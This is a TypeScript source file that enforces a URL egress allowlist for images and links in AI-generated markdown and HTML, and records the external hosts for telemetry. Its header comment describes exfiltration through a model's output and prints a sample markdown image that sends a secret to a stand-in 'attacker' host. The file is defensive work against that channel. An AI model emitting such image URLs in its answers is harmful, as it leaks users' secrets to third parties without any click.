// URL egress policy shared by the browser and the server (no imports, no I/O).
//
// Anything the model, a tool or a file can write into an answer, a document or a deck can carry data in a URL
// (`![](https://attacker/p.png?d=<secret>)`): the browser fetches it with no click. This module is the one place that
// decides which origins may be fetched and lists the external hosts a text references:
//
//   parseAllowedOrigins  EXTERNAL_ASSET_ORIGINS / the admin list -> validated origins (wildcards refused)
//   classifyImageSrc     one image `src` -> same-origin | data | blob | relative | allowed | blocked
//   externalUrlHosts     the distinct external hosts in markdown or HTML (host only; for telemetry)
//
// Every URL is parsed with `new URL(src, appOrigin)`, the browser's own serialization, and compared by exact origin.
// String tricks (suffix, prefix, userinfo, port, trailing dot, percent-encoded host, protocol-relative) therefore
// cannot pass for an allowed host; anything unparsable fails closed.

export type AllowedOrigin = { origin: string; pathPrefix?: string } // origin = 'https://host[:port]'
export type EgressPolicy = { allowedOrigins: readonly AllowedOrigin[] }
export const EMPTY_EGRESS_POLICY: EgressPolicy = Object.freeze({ allowedOrigins: Object.freeze([]) as readonly AllowedOrigin[] })

export type ImageSrcClass =
  | { kind: 'same-origin' | 'data' | 'blob' | 'relative' }
  | { kind: 'allowed'; host: string }
  | { kind: 'blocked'; host: string | null } // host null = unparsable / non-http scheme

const MAX_ALLOWED_ORIGINS = 32
const MAX_TEXT = 1_000_000

// ---- allowlist ---------------------------------------------------------------------------------------------------

// https://host[:port], host = at least two DNS labels. No wildcard, path, query, fragment, userinfo, quote or space.
const ORIGIN = /^https:\/\/([a-z0-9-]+(?:\.[a-z0-9-]+)+)(?::(\d{1,5}))?$/
const LABEL = /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/
const IPV4 = /^\d{1,3}(?:\.\d{1,3}){3}$/
// hosts of the platform that carries the app: never an allowed egress origin
const PLATFORM_SUFFIXES = ['databricks.com', 'databricks.net', 'databricksapps.com', 'azuredatabricks.net', 'databricks.azure.cn', 'databricks.azure.us']
const isOrUnder = (host: string, suffix: string): boolean => host === suffix || host.endsWith(`.${suffix}`)

function hostOf(h: unknown): string {
  const s = typeof h === 'string' ? h.trim().toLowerCase() : ''
  if (!s) return ''
  try {
    return new URL(/^[a-z][a-z0-9+.-]*:\/\//.test(s) ? s : `https://${s}`).hostname
  } catch {
    return ''
  }
}

const shown = (v: unknown): string => {
  const s = typeof v === 'string' ? v : String(v)
  return s.length > 200 ? `${s.slice(0, 200)}…` : s
}

/**
 * EXTERNAL_ASSET_ORIGINS (space- or comma-separated) or the admin list -> validated entries, lowercased, deduped, in order.
 * Same rules as sanitizeCspDomains (server/mcpApps.ts) with wildcards refused: https only, no userinfo, path, query or
 * fragment, no IP literal, at least two labels, at most 32 entries, never the app, workspace or Databricks hosts.
 * Invalid entries (and those past the cap) are returned in `rejected`, for a startup warning.
 */
export function parseAllowedOrigins(
  raw: string | readonly string[] | undefined,
  hosts?: { appHost?: string; workspaceHost?: string },
): { allowed: AllowedOrigin[]; rejected: string[] } {
  const items: unknown[] = typeof raw === 'string' ? raw.split(/[\s,]+/) : Array.isArray(raw) ? [...raw] : []
  const app = hostOf(hosts?.appHost)
  const ws = hostOf(hosts?.workspaceHost)
  const allowed: AllowedOrigin[] = []
  const rejected: string[] = []
  const seen = new Set<string>()
  for (const item of items) {
    if (typeof item === 'string' && item.trim() === '') continue
    const entry = typeof item === 'string' ? item.trim() : null
    const m = entry && entry.length <= 253 + 12 ? ORIGIN.exec(entry.toLowerCase()) : null
    const host = m?.[1]
    const port = m?.[2]
    const portOk = port === undefined || (Number(port) >= 1 && Number(port) <= 65535)
    const ok =
      !!host &&
      portOk &&
      host.split('.').every((l) => LABEL.test(l)) &&
      !IPV4.test(host) &&
      host !== app &&
      host !== ws &&
      !PLATFORM_SUFFIXES.some((s) => isOrUnder(host, s))
    if (!ok) {
      rejected.push(shown(item))
      continue
    }
    const origin = `https://${host}${port && port !== '443' ? `:${Number(port)}` : ''}`
    if (seen.has(origin)) continue
    if (allowed.length >= MAX_ALLOWED_ORIGINS) {
      rejected.push(shown(item))
      continue
    }
    seen.add(origin)
    allowed.push({ origin })
  }
  return { allowed, rejected }
}

// ---- image classification ----------------------------------------------------------------------------------------

const SCHEME = /^[a-z][a-z0-9+.-]*:/i
const PROTOCOL_RELATIVE = /^[/\\]{2}/
const SAFE_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp|svg\+xml)[;,]/i

/** What the URL parser does before it looks at anything: drop tab/CR/LF everywhere, trim C0 controls and spaces. */
const cleanUrl = (s: string): string => s.replace(/[\t\n\r]/g, '').replace(/^[\u0000- ]+|[\u0000- ]+$/g, '')

function parse(src: string, base: string): URL | null {
  try {
    return new URL(src, base)
  } catch {
    try {
      return new URL(src)
    } catch {
      return null
    }
  }
}

/**
 * One image `src`, parsed with new URL(src, appOrigin) like the browser. data: must be a raster or svg+xml image;
 * protocol-relative, credentials, non-default ports (unless the allowed origin names them), http: and unknown schemes
 * are blocked. A `%` in the authority is refused (a host that needs decoding is never legitimate).
 */
export function classifyImageSrc(src: string, policy: EgressPolicy, appOrigin: string): ImageSrcClass {
  if (typeof src !== 'string') return { kind: 'blocked', host: null }
  const s = cleanUrl(src)
  if (!s) return { kind: 'relative' }
  const scheme = SCHEME.exec(s)?.[0]?.toLowerCase()
  if (scheme === 'data:') return SAFE_DATA_IMAGE.test(s) ? { kind: 'data' } : { kind: 'blocked', host: null }
  if (scheme === 'blob:') return { kind: 'blob' }
  const u = parse(s, appOrigin)
  if (scheme && scheme !== 'http:' && scheme !== 'https:') return { kind: 'blocked', host: null }
  if (!u || (u.protocol !== 'http:' && u.protocol !== 'https:')) return { kind: 'blocked', host: null }
  const host = u.hostname.toLowerCase()
  const blocked: ImageSrcClass = { kind: 'blocked', host: host || null }
  if (PROTOCOL_RELATIVE.test(s)) return blocked
  if (scheme) {
    const authority = /^[a-z][a-z0-9+.-]*:[/\\]{0,}([^/\\?#]*)/i.exec(s)?.[1] ?? ''
    if (authority.includes('%')) return blocked
  }
  if (u.username || u.password) return blocked
  if (u.origin === appOrigin) return scheme ? { kind: 'same-origin' } : { kind: 'relative' }
  if (u.protocol === 'https:' && policy.allowedOrigins.some((a) => a.origin.toLowerCase() === u.origin)) return { kind: 'allowed', host }
  return blocked
}

// ---- external hosts in text --------------------------------------------------------------------------------------

const NAMED_ENTITIES: Record<string, string> = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", colon: ':', sol: '/', tab: '\t', newline: '\n', lpar: '(', rpar: ')', period: '.', num: '#', equals: '=', quest: '?', percnt: '%', commat: '@' }
function decodeEntities(s: string): string {
  return s.replace(/&(?:#(\d{1,7})|#x([0-9a-f]{1,6})|([a-z]{2,8}));?/gi, (all, dec, hex, name) => {
    try {
      if (dec !== undefined) return String.fromCodePoint(Number(dec))
      if (hex !== undefined) return String.fromCodePoint(parseInt(hex, 16))
    } catch {
      return all
    }
    const v = NAMED_ENTITIES[String(name).toLowerCase()]
    return v === undefined ? all : v
  })
}

type Sink = { images: string[]; links: string[] }

/** The host of `url` when it leaves the app (http, https, ftp, ws, wss), else null. */
function externalHost(url: string, appOrigin: string): string | null {
  const s = cleanUrl(url)
  if (!s || s.startsWith('#')) return null
  const u = parse(s, appOrigin)
  if (!u || !/^(?:https?|ftp|wss?):$/.test(u.protocol) || !u.hostname || u.origin === appOrigin) return null
  return u.hostname.toLowerCase()
}

function add(list: string[], url: string, appOrigin: string): void {
  const h = externalHost(url, appOrigin)
  if (h && !list.includes(h)) list.push(h)
}

const TAG = /<([a-z][\w:-]*)((?:[^<>"']|"[^"]*"|'[^']*')*)>/gi
const ATTR = /([^\s"'<>/=]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/g
const CSS_URL = /url\(\s*(?:"([^"]*)"|'([^']*)'|([^)\s"']*))\s*\)/gi
const CSS_IMPORT = /@import\s+(?:"([^"]*)"|'([^']*)')/gi
const LINK_TAGS = new Set(['a', 'area'])
const LINK_ATTRS = new Set(['ping', 'action', 'formaction'])
const URL_ATTRS = new Set(['src', 'href', 'xlink:href', 'poster', 'data', 'background', 'longdesc', 'icon'])

function scanCss(css: string, sink: Sink, appOrigin: string): void {
  for (const m of css.matchAll(CSS_URL)) add(sink.images, m[1] ?? m[2] ?? m[3] ?? '', appOrigin)
  for (const m of css.matchAll(CSS_IMPORT)) add(sink.images, m[1] ?? m[2] ?? '', appOrigin)
}

function scanHtml(html: string, sink: Sink, appOrigin: string): void {
  scanCss(html, sink, appOrigin)
  for (const t of html.matchAll(TAG)) {
    const tag = (t[1] as string).toLowerCase()
    for (const a of (t[2] as string).matchAll(ATTR)) {
      const name = (a[1] as string).toLowerCase()
      const value = decodeEntities(a[2] ?? a[3] ?? a[4] ?? '')
      if (name === 'style') scanCss(value, sink, appOrigin)
      else if (name === 'srcset') for (const c of value.split(/\s*,\s*/)) add(sink.images, c.trim().split(/\s+/)[0] ?? '', appOrigin)
      else if (name === 'ping') for (const p of value.split(/\s+/)) add(sink.links, p, appOrigin)
      else if (LINK_ATTRS.has(name)) add(sink.links, value, appOrigin)
      else if (URL_ATTRS.has(name)) add(LINK_TAGS.has(tag) ? sink.links : sink.images, value, appOrigin)
    }
  }
}

const LABEL_RE = String.raw`(?:[^\[\]\\]|\\.|\[[^\[\]]*\])*`
const INLINE = new RegExp(String.raw`(!?)\[(${LABEL_RE})\]\(\s*(<[^>\n]*>|(?:[^\s()\\]|\\.|\((?:[^\s()\\]|\\.)*\))*)(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)`, 'g')
const REF = new RegExp(String.raw`(!?)\[(${LABEL_RE})\](?:\[([^\[\]]*)\])?`, 'g')
const DEF = /^ {0,3}\[((?:[^\[\]\\]|\\.)+)\]:[ \t]*\n?[ \t]*(<[^>\n]*>|\S+)[^\n]*$/gm
const BARE = /\b(?:https?|ftp):\/\/[^\s<>"'`()[\]]+/gi
const normLabel = (s: string): string => s.trim().replace(/\s+/g, ' ').toLowerCase()
const unangle = (d: string): string => (d.startsWith('<') && d.endsWith('>') ? d.slice(1, -1) : d)

/** Drops fenced code and code spans: they are not rendered, so they carry no request. */
function stripCode(md: string): string {
  const out: string[] = []
  let fence: string | null = null
  for (const line of md.split('\n')) {
    const f = /^ {0,3}(```+|~~~+)/.exec(line)?.[1]
    if (fence === null) {
      if (f) fence = f[0] as string
      else out.push(line)
    } else if (f && f[0] === fence && line.trim() === f) fence = null
  }
  return out.join('\n').replace(/`[^`\n]*`/g, ' ')
}

function scanMarkdown(md: string, sink: Sink, appOrigin: string): void {
  const defs = new Map<string, string>()
  let text = stripCode(md).replace(DEF, (_all, label: string, dest: string) => {
    const k = normLabel(label)
    if (!defs.has(k)) defs.set(k, unangle(dest))
    return `\u0000${k}\u0000` // marker keeps the definition out of the other scans
  })
  // inline links and images (a label may hold another image: recurse), blanked once seen
  const inline = (s: string): string =>
    s.replace(INLINE, (_all, bang: string, label: string, dest: string) => {
      add(bang ? sink.images : sink.links, unangle(dest), appOrigin)
      inline(label)
      return ' '
    })
  text = inline(text)
  // reference-style, only when a definition exists
  text = text.replace(REF, (all, bang: string, label: string, ref: string | undefined, off: number, whole: string) => {
    const next = whole[off + all.length]
    if (next === '(' || next === ':' || next === '\u0000') return all
    const key = normLabel(ref !== undefined && ref !== '' ? ref : label)
    const dest = defs.get(key)
    if (dest !== undefined) add(bang ? sink.images : sink.links, dest, appOrigin)
    return ' '
  })
  text = text.replace(/\u0000[^\u0000]*\u0000/g, ' ')
  // `<https://host/x>` autolinks, before the HTML scan reads them as a tag
  text = text.replace(/<((?:https?|ftp):\/\/[^\s<>]+)>/gi, (_all, url: string) => {
    add(sink.links, url, appOrigin)
    return ' '
  })
  scanHtml(text, sink, appOrigin)
  // GFM autolinks and bare URLs, outside of HTML tags
  for (const m of text.replace(TAG, ' ').matchAll(BARE)) add(sink.links, m[0], appOrigin)
}

/**
 * Distinct external hosts (host only, lowercased, first-seen order) referenced by images and by links in markdown
 * (inline, reference-style, autolinks, bare URLs, raw HTML) or by src/srcset/href/ping/url()/@import in HTML.
 * Telemetry: it never returns a path, a query or a port.
 */
export function externalUrlHosts(text: string, mode: 'markdown' | 'html', appOrigin: string): { images: string[]; links: string[] } {
  const sink: Sink = { images: [], links: [] }
  if (typeof text !== 'string' || !text) return sink
  const t = text.length > MAX_TEXT ? text.slice(0, MAX_TEXT) : text
  try {
    if (mode === 'html') scanHtml(t, sink, appOrigin)
    else scanMarkdown(t, sink, appOrigin)
  } catch {
    // telemetry must never throw into the caller
  }
  return sink
}
